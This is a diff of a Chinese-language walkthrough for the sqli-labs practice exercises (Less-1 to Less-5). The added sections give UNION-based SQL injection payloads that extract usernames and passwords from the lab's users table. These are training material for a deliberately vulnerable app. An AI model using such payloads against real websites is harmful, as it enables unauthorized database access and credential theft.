@@ -58,4 +58,38 @@ http://d83b1fd5-8cf3-4432-8298-910dffdeaed0.node5.buuoj.cn/Less-1?id=1' and 1=2 
 
 ![less-1-2](./assets/sqli-libs/less-1-2.png)
 
-这道题就解决了。
+这道题就解决了,这是基础用法，一般不可能在真正的src渗透中找到这种门户大开的漏洞。
+
+
+### Less-2 (GET-基于错误的数字型注入)
+
+解法跟 [Less-1](#less-1-get---基于错误的字符串注入)相同，只需要去掉前面的 `'` 符号。
+
+### Less-3 (GET-基于错误的带有括号的单引号字符串注入)
+
+这题既然也是报错，那我们就一步到位使用`Less`最后的pyload
+
+```bash
+/Less-3/?id=1 ' AND 1=2 union select 1,(select group_concat(password) from security.users) 
+```
+
+![less-3-1](./assets/sqli-libs/less-3-1.png)
+
+根据错误，我们只需再补充一个括号就好了。
+
+```bash
+/Less-3/?id=1 ') AND 1=2 union select 1,(select group_concat(password) from security.users) ,(select group_concat(username) from security.users) --+
+```
+
+### Less-4 (基于错误的双引号字符型注入)
+
+第四题看题目猜答案。
+
+```bash
+/Less-4/?id=1 ") AND 1=2 union select 1,(select group_concat(password) from security.users) ,(select group_concat(username) from security.users) --+
+```
+
+### Less-5 (双注入-单引号-字符型)
+
+
+
